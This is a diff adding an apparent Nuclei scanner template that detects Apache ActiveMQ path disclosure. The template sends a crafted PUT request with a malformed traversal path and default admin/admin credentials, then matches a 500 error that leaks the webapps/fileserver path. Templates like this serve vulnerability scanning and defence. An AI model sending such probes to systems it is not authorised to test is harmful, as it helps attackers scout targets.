@@ -1,0 +1,27 @@
+id: activemq-path-disclosure
+
+info:
+  name: ActiveMQ Path Disclosure
+  author: HuanXiong
+  severity: info
+
+  tags: Information Disclosure
+
+http:
+  - raw:
+      - |
+        PUT /fileserver/a../../%08/..%08/.%08/%08\\ HTTP/1.1
+        Host: {{Hostname}}
+
+        username=admin&password=admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "\\webapps\\fileserver\\"
+          - "/webapps/fileserver/"
+        part: body
